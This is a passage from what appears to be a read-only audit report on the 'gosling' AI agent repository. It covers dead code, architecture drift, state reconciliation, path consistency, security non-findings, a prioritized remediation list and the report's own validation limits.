| DEAD-026 vendored copy | `vendor/v8` is a live workspace member (`Cargo.toml:5`) |
| DEAD-027 IaC | Surface-not-present |
| DEAD-028 scheduled job | test-finder cron dead; workflow not |
| DEAD-029 unused permission | Not Reviewed |
| DEAD-030 expired temp | PostHog “do not collect” vs leftover key |
| DEAD-031 stale generated | Not Reviewed (`ui/desktop/out/` is local package residue) |
| DEAD-032 rotted sample | Not Reviewed |

**Unreferenced vs dead:** only `EXTRACTION_PLAN` A/B paths and the test-finder **cron** are confirmed unreached. `Scheduled` is unreferenced-as-create, not confirmed dead. PostHog is referenced and runtime-dead.

---

## 7. Architecture drift (limited; AID-001..014)

Orientation said there is no formal registry. **That sentence is stale.** `.architecture/README.md` and `.architecture/invariants.yaml` exist (`ARC-001`–`ARC-010`). This run did **not** evaluate the registry mechanically. Intent-relative findings stay capped at Likely except where a quoted contradiction is structural.

| AID | Disposition |
|---|---|
| AID-001 Partial impl | `ARC-GSL-001` version 0.1.0; Default Shell GUI explicitly paused (ADR-0014 / DS-7) — **intentional**, not accidental incomplete |
| AID-002 Duplicate impl | Tagteam provider + `tagteam-workflow` feature: allowed by `.architecture/invariants.yaml` ARC-005 |
| AID-003 Abandoned | `EXTRACTION_PLAN` A/B abandoned-as-docs; code already gone |
| AID-004 Accidental | No extra accidental subsystem found in budget |
| AID-005 Dead interface | `SessionType::Scheduled` create API: likely unused |
| AID-006 Orphan service | test-finder paused; Tagteam feature off by default (`Cargo.toml:23`) |
| AID-007 Unused abstraction | Not Reviewed |
| AID-008 Excessive indirection | Not Reviewed (route to seam lens) |
| AID-009 Declared-design contradiction | `PGR-GSL-002` vs ADR-0002 scoped credentials — **Likely/Confirmed** env export |
| AID-010 Doc drift | `DEAD-GSL-001`, `REC-GSL-002`, prior cloud audits |
| AID-011 Testing gap | Shell R4 integration suite is local-only (`build-state.md` notes `vitest.integration.config.ts` not in default CI) |
| AID-012 Ownership | Single CODEOWNERS/MAINTAINERS `@e3742526` — unambiguous, not contested |
| AID-013 Coupling growth | **N/A — role absent** (no `.architecture/baselines/`) |
| AID-014 Invariant violation | Not evaluated as an engine; sampled ARC-005 held as declared exception |

Health score: **not computed** (no baseline, limited scope). Trend: unavailable.

---

## 8. State reconciliation

### Source consistency matrix

| Item | Source claim | Freshness | Other source | Class |
|---|---|---|---|---|
| HEAD / branch | Orientation + `.git/refs/heads/main` = `073d19428` on `main` | this run | agrees | complete |
| Working tree | Orientation: clean | this run | not re-run `git status` (no shell); `.env` files exist but are gitignored | unverifiable here / likely clean |
| DS-7 | Shell build-state: technical GO, wait for operator | 2026-08-15 | `docs/TODO.md` same | open (human) |
| Gemini OAuth | `docs/TODO.md:5-8` open | 2026-08-15 | HEAD commit is **XAI** OAuth, not Gemini | open |
| v1.0.0 version bump | TODO open | 2026-07-20 | `Cargo.toml` still `0.1.0` | open |
| Tagteam productization | TODO deferred feature | 2026-07-12 | `tagteam-workflow` feature empty-default | deferred |
| AWS env export | TODO open | 2026-08-12 | `aws_env.rs` still exports | open |
| Chat auto-follow | TODO open (2026-07-17) vs later “fixed” (2026-07-20) | mixed | 2026-07-17 unchecked item vs 2026-07-20 checked item | **duplicate/stale checkbox** — treat 2026-07-20 as later |
| Repair commits “local until push” | `docs/TODO.md:176-177` | 2026-07-17 | current `main` contains later shell work | stale |
| Historical TRIAGE-GSL-001 comment-build bypass | `docs/cloud/audit-security-repo-triage.md` | older | Windows/Intel now use `security_check.outputs.authorized` | **repaired** |
| Historical PGR Auto default | `docs/cloud/audit-dataflow-pipeline-graph.md` | older | `GoslingMode::default() == SmartApprove` | **repaired** |
| Historical inspector fail-open | same | older | `tool_inspection.rs:130-141` fail closed | **repaired** |
| Historical SecurityInspector disabled default | same | older | `SECURITY_PROMPT_ENABLED` `unwrap_or(true)` | **repaired** |
| Historical unpinned `Jimver/cuda-toolkit@v0.2.35` | triage report | older | now SHA `3d45d157…` | **repaired** |
| `ui/desktop/.env` committed | older posture report | older | `ui/desktop/.gitignore:20` `.env`; file on disk is placeholders only | **ignore rule present**; tracked-status not proven (`git ls-files` not run) |
| `.architecture/` registry | orientation: none | 2026-08-15 morning | files exist | orientation stale |
| Workspaces campaign | `docs/build/build-state.md` complete 2026-07-19 | old | still true as a campaign | complete / historical |
| 2026-07-05 master report | `docs/cloud/99-master-report.md` | 2026-07-05 | must not be used as current verdict | stale |

### Open / next

Highest-value next action (evidence, not preference):

1. **Human:** record the DS-7 operator GO/NO-GO (`docs/build/shell-productization/build-state.md`). No GUI work until that decision.
2. **Repair (bounded):** `RPC-GSL-001` plugin settings path + `PGR-GSL-001` egress Auto downgrade (XS/S, tests exist around inspectors).
3. **Human:** resolve `REC-GSL-001` publishing identity before treating Scorecard/deny/auto-merge as applying to this remote.
4. **Backlog:** Gemini OAuth (`docs/TODO.md`), AWS env export, `download_cli.sh` verify, remove/disarm test-finder.

Alternatives if the operator’s goal is open-source publish rather than Default Shell: execute `RELEASE_CHECKLIST.md` / version bump first.

---

## 9. Path consistency

### Provenance matrix (static)

| Command / entry | Wrapper | Resolver | Intended source | Disposition |
|---|---|---|---|---|
| `source bin/activate-hermit` | `bin/activate-hermit:13-14` eval `hermit activate` | Hermit env + `HERMIT_STATE_DIR` under `~/Library/Caches/hermit` (`bin/cargo:7-15`) | this checkout’s `bin/` + user cache packages | **intentional local state**; relocating the repo keeps the cache, not a second checkout |
| `cargo` after hermit | `bin/cargo` generated | Hermit dist URL GitHub releases | hermit-pinned toolchain, not Homebrew | Held if activated; **RPC-011** if operator skips activate (`SHP-DEF-010` already recorded Homebrew 1.97 vs pin) |
| `cargo run -p gosling-cli` | hermit cargo | workspace `Cargo.toml` | this tree | Held (static) |
| Desktop `pnpm` / Electron | `ui/desktop`; `GOSLING_PATH_ROOT` forwarded in `main.ts:1008-1100` | Node from hermit `bin/node` if activated | this tree + optional isolated root | Held if hermit+env set |
| `download_cli.sh` | curl to GitHub | `repo-makeover/gosling` | **not this checkout** | `RSP-GSL-001` + `REC-GSL-001` |
| Tests using `GOSLING_PATH_ROOT` | many crates | mixed `$ROOT/config` vs `$ROOT/.config/gosling` | this tree | **RPC-GSL-001** |
| Shell `RuntimePaths` | `paths.rs` task-local | data/state namespaced; plugins not | product-local | **RPC-GSL-002** |

### Relocation matrix (static only; no move drill)

| Angle | Result |
|---|---|
| Parent directory rename | Hermit activate is relative (`BIN_DIR` from script location) — should follow. Cache stays on `$HOME`. |
| Different user home | Hermit re-downloads into that user’s cache. |
| Fresh clone | Needs `source bin/activate-hermit`; no inherited `.venv`. |
| Two worktrees | Not observed. Shared user hermit cache could reuse packages (usually desirable). `GOSLING_PATH_ROOT` required to avoid shared `~/.config/gosling`. |
| IDE without hermit | `SHP-DEF-010` class: Homebrew/system rust judges a different compiler. |
| Case folding | `core.ignorecase=true`; Windows/macOS risk not deep-audited. |

RPC-001 committed machine paths in **product source**: not found. `/Users/eric/...` hits are session logs, playtests, and `docs/cloud` reports (documentation of a run), plus fictional fixtures. Non-finding for runtime portability.

RPC-005 worktree drift: **not present**.

RPC-014: this audit’s own validation commands were **not** executed; do not treat this report as a test-oracle for the tree.

---

## 10. Not observable / not applicable

**Not observable**
- GitHub branch protection, required checks, force-push block, ruleset `18782969` (mentioned in `plan.md` only).
- Org secret scanning / push protection.
- Whether `OPENAI_API_KEY` / signing secrets are populated.
- Whether `github.repository` for the operator’s push remote is `repo-makeover/gosling` or `cephalopod-ai/gosling`.
- Live validity of the PostHog key (not tested).

**Not applicable**
- Self-hosted runners (no `self-hosted` in workflows).
- Graph-DB / Supabase / Flutter / Go product surfaces (orientation N/A, re-checked only as absence).

---

## 11. Non-findings (checked and held)

- **Comment-build authorization gate** now matches ARM/CLI siblings (`pr-comment-bundle-windows.yml:38`, `pr-comment-bundle-intel.yml:36`). Historical TRIAGE-GSL-001 **does not reproduce**.
- **`pull_request_target` quarantine** checks out default `actions/checkout` (base, not PR head) and only interpolates login/number (`quarantine.yml:3-38`). No untrusted code execution found.
- **Dependabot auto-merge** does not check out PR head.
- **Third-party `uses:`** sampled majority are full SHA + version comment. `Jimver/cuda-toolkit` is SHA-pinned. `peter-evans/create-or-update-comment` is SHA-pinned.
- **Docker `FROM`** in root `Dockerfile:6,37` pinned by digest.
- **No `self-hosted` runners** in `.github/workflows`.
- **CI default `permissions: contents: read`** (`ci.yml:15-16`).
- **`SECURITY.md`** private disclosure path exists.
- **Dependabot** covers cargo, npm `/ui`, docker, github-actions.
- **Default tool mode is SmartApprove**, not Auto (`gosling_mode.rs:28-29`).
- **SecurityInspector enabled by default** (`security/mod.rs:52-54` `unwrap_or(true)`); does **not** auto-downgrade (`security_inspector.rs:61-65`).
- **Inspector errors fail closed** (`tool_inspection.rs:130-141`).
- **Missing permission inspector → all `needs_approval`** (`agent.rs:2695-2704`).
- **Dropped local-inference / gateway / llama-cpp** are **absent**, not leftover modules.
- **`handle_fork_session` is live** via dispatch (not dead).
- **Hermit wrappers are generated and relative**; `HERMIT_USER_HOME=~` is the documented cache contract, not a committed checkout path.
- **`ui/desktop/.env` on disk** contains only `VITE_START_EMBEDDED_SERVER` / public OpenAI host/model placeholders (`ui/desktop/.env:1-4`) and is ignored (`ui/desktop/.gitignore:20`).

---

## 12. Recommended remediation order

1. Human identity decision (`REC-GSL-001`) so CI gates and install URLs match the remote you actually ship.
2. Disarm or delete `test-finder.yml` write/secret surface (`RST-GSL-001`).
3. Stop attaching `id-token: write` to comment-triggered PR-head builds (`RST-GSL-002`).
4. Verify `download_cli.sh` against CI attestations (`RSP-GSL-001`).
5. Fix `GOSLING_PATH_ROOT` plugin settings (`RPC-GSL-001`) and decide plugin-home scoping (`RPC-GSL-002`).
6. Egress Auto downgrade (`PGR-GSL-001`).
7. Add secret scanning (`RSP-GSL-002`) and broaden cargo-deny (`RSP-GSL-003`) before relying on auto-merge (`RSP-GSL-004`).
8. Reconcile `EXTRACTION_PLAN.md` and mark `docs/build/build-state.md` historical.
9. AWS env export (`PGR-GSL-002`) — already on the TODO ledger.
10. DS-7 operator GO, then Gemini OAuth — product, not repo-posture.

---

## 13. Skill escalation

| Finding | Primary lens | Secondary lens | Why |
|---|---|---|---|
| RSP-GSL-001 | Compliance-Posture | Input-Output-Path / Cascade | Installer output becomes the operator’s binary authority |
| RSP-GSL-002 | Repo-Security | Temporal | Leaked secrets persist in history |
| RSP-GSL-004 | Repo-Security | Negative-Space | Auto-merge assumes advisory-only deny is enough |
| RST-GSL-001 | Repo-Security | Dead-Code | Paused cron, live privileged dispatch |
| RST-GSL-002 | Repo-Security | Cascade | Maintainer comment → untrusted build → OIDC |
| DEAD-GSL-001 | Dead-Code | Architecture | Docs invent modules that are gone |
| PGR-GSL-001 | Pipeline / Failsafe | Security-LLM | Auto mode undoes egress gate |
| PGR-GSL-002 | Security | Concurrency / ADR-0002 | Process-global creds vs session scope |
| REC-GSL-001 | State reconciliation | Posture | Wrong remote silently disables gates |
| RPC-GSL-001 | Path consistency | Data-Integrity | Isolation tests can lie |
| RPC-GSL-002 | Path consistency | Architecture | Shell namespace incomplete |

---

## 14. Validation limits

- No `git status`, `cargo test`, `clippy`, `pnpm test`, or Scorecard API this run (no shell; read-only).
- No Git history secret scan.
- No platform branch-protection API.
- No execution of comment-build or release workflows.
- Pipeline Gates 7–11 harness not written.
- Dead-code dynamic edges (serde, ACP method names, Electron IPC strings) cap several claims at Likely.
- `ui/desktop/out/` packaged apps and `node_modules` were not treated as source.
- Prior playtest/CI greens are dated ledgers, not this session’s oracle.

---

## 15. Files inspected (representative)

`.github/workflows/{ci,release,quarantine,dependabot-auto-merge,pr-comment-*,test-finder,cargo-deny,scorecard,take,create-release-branch,publish-npm,docs-update-cli-ref}.yml`, `.github/{CODEOWNERS,dependabot.yml}`, `SECURITY.md`, `deny.toml`, `Dockerfile`, `download_cli.sh`, `Cargo.toml`, `crates/gosling/Cargo.toml`, `crates/gosling/src/{config/paths.rs,plugins/discovery.rs,tool_inspection.rs,security/{mod,security_inspector,egress_inspector}.rs,providers/{aws_env,bedrock}.rs,posthog.rs,session/session_manager.rs,acp/server.rs,agents/agent.rs}`, `crates/gosling-providers/src/gosling_mode.rs`, `crates/gosling-mcp/src/lib.rs`, `ui/desktop/src/{main.ts,bin/node-setup-common.sh}`, `ui/desktop/.env`, `ui/desktop/.gitignore`, `bin/{activate-hermit,hermit.hcl,cargo,README.hermit.md}`, `docs/{TODO,INDEX,INTENT,architecture}.md`, `docs/adr/{0002,0005,0008,0014}*`, `docs/build/{build-state,defects}.md`, `docs/build/shell-productization/{build-state,defects}.md`, `docs/logs/session/2026-08-15-default-shell-ds7-corrective-closure.md`, `docs/cloud/{2026-08-15-orientation,audit-security-repo-*,audit-deadcode-cleanup,audit-dataflow-pipeline-graph,99-master-report}.md`, `EXTRACTION_PLAN.md`, `UPSTREAM.md`, `CONTRIBUTING.md`, `MAINTAINERS.md`, `.architecture/{README,invariants,components}.yaml`, `.git/{HEAD,config,refs/heads/main}`.
